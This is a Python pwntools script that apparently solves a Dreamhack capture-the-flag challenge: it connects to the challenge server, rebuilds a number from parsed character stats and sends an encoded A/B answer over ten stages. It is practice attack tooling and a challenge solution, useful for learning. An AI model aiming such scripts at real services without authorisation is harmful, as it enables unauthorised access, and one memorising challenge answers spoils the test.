from pwn import *
import re


#p = process("./prob")
p = remote("host1.dreamhack.games", 18937)

context.log_level="debug"

pattern = b"HP:\s+(\d+), STR:\s+(\d+), AGI:\s+(\d+), VIT:\s+(\d+), INT:\s+(\d+), END:\s+(\d+), DEX:\s+(\d+)"

def parse_status(line):
    pattern_match = re.search(pattern, line)
    if pattern_match:
        hp, _str, agi, vit, _int, end, dex = map(int, pattern_match.groups())
        print(hp, _str, agi, vit, _int, end, dex)
        return hp, _str, agi, vit, _int, end, dex

def deserialize(_hp, _str, agi, vit, _int, end, dex):
    # DEX
    dex = dex << 0x28
    # END
    end = end << 0x20

    #INT
    _int = _int << 0x18

    #VIT
    vit = vit << 0x10

    #AGI
    agi = agi << 0x8

    #STR
    _str = _str

    #HP
    _hp = _hp << 0x30
    return _hp | _str | agi | vit | _int | end | dex

def getABstr(digit):
    ab_str = b""
    while digit:
        if digit % 2 == 0:
            digit = digit // 2
            ab_str += b"B"
        else:
            digit = digit - 1
            ab_str += b"A"
    ab_str = ab_str[::-1] + b"\x00"
    return ab_str


for _ in range(10):
    p.recvuntil(b"[STAGE")
    p.recvline()
    spells = p.recvline()
    urandom = deserialize(*parse_status(spells))
    
    abstr = getABstr(urandom)
    p.sendline(abstr)


p.interactive()
